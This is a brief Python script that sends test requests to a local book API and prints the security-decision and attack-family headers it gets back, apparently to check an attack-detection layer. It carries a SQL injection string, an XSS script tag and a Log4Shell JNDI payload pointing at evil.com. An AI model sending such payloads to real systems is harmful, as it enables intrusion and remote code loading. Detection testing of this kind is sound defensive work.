import urllib.request
import json

cases = [
    ('SQLI', 'http://localhost:8080/api/books?search=%27%20OR%20%271%27=%271%20--%20UNION%20SELECT%20*', 'GET', None),
    ('XSS', 'http://localhost:8080/api/comments/book/101', 'POST', b'{"text": "<script>alert(1)</script>"}'),
    ('LOG4J', 'http://localhost:8080/api/comments/book/101', 'POST', b'{"text": "${jndi:ldap://evil.com/a}"}'),
    ('NORMAL', 'http://localhost:8080/api/books', 'GET', None)
]
for name, url, method, data in cases:
    req = urllib.request.Request(url, data=data, method=method, headers={'Content-Type': 'application/json', 'User-Agent': 'curl/7.68.0'})
    try:
        res = urllib.request.urlopen(req)
        print(name, res.status, res.headers.get('X-Security-Decision'), res.headers.get('X-Attack-Family'))
    except urllib.error.HTTPError as e:
        print(name, e.code, e.headers.get('X-Security-Decision'), e.headers.get('X-Attack-Family'), e.read().decode())
